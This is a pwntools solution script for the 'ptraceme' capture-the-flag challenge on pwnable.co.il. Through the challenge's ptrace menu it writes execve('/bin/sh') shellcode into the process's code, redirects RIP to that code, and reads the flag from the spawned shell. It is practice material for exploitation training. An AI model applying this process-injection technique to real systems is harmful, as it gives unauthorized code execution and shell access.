#!/usr/bin/env python3
import warnings
from pwn import *

elf = ELF("ptraceme", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)
context.binary = elf

SHELLCODE_ADDR = 0x401276  # init_buffering is already executed so its safe to overwrite

gs = '''
continue
'''


def run_program():
    if args.LOCAL:
        return process([elf.path])
    elif args.GDB:
        return gdb.debug(elf.path, gs)
    else:
        return remote("pwnable.co.il", 9014)


class Options:
    PTRACE_PEEKTEXT = 1
    PTRACE_PEEKUSER = 3
    PTRACE_POKETEXT = 4
    PTRACE_POKEUSER = 6

    # user_regs_struct offsets
    OFF_RIP = 128
    OFF_RSP = 152

    def __init__(self, r):
        self.r = r

    def start(self):
        self.r.recvline()

    def ptrace_call(self, req, addr, data):
        self.r.sendlineafter(b"Finish", b"1")
        self.r.sendlineafter(b"Request:", str(req))
        self.r.sendlineafter(b"Address:", str(addr))
        self.r.sendlineafter(b"Data:", str(data))
        self.r.recvuntil(b"Value: ")
        return int(self.r.recvline().strip(), 16)

    def peek_text(self, addr):
        return self.ptrace_call(self.PTRACE_PEEKTEXT, addr, 0)

    def poke_text(self, addr, data):
        return self.ptrace_call(self.PTRACE_POKETEXT, addr, data)

    def peek_user(self, offset):
        return self.ptrace_call(self.PTRACE_PEEKUSER, offset, 0)

    def poke_user(self, offset, data):
        return self.ptrace_call(self.PTRACE_POKEUSER, offset, data)

    def detach(self):
        self.r.sendlineafter(b"Finish", b"2")


class ExploitPrimitives:
    def __init__(self, r):
        self.option = Options(r)
        self.r = r

    def inject_shellcode(self):
        shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))
        while len(shellcode) % 8:
            shellcode += b'\x90' # nop

        for i in range(0, len(shellcode), 8):
            addr = SHELLCODE_ADDR + i
            data = u64(shellcode[i:i+8])
            val = self.option.poke_text(addr, data)
            log.info(f"POKETEXT {hex(addr)}: {'OK' if val == 0 else hex(val)}")

    def hijack_rip(self):
        val = self.option.poke_user(Options.OFF_RIP, SHELLCODE_ADDR)
        log.info(f"Set RIP -> {hex(SHELLCODE_ADDR)}: {'OK' if val == 0 else hex(val)}")

    def win(self):
        self.option.detach()
        self.r.sendline(b"cat flag")
        log.success(self.r.recvrepeat(3).decode()[1:])
        self.r.close()


def main():
    r = run_program()
    exploit = ExploitPrimitives(r)
    exploit.option.start()
    exploit.inject_shellcode()
    exploit.hijack_rip()
    exploit.win()


if __name__ == "__main__":
    main()
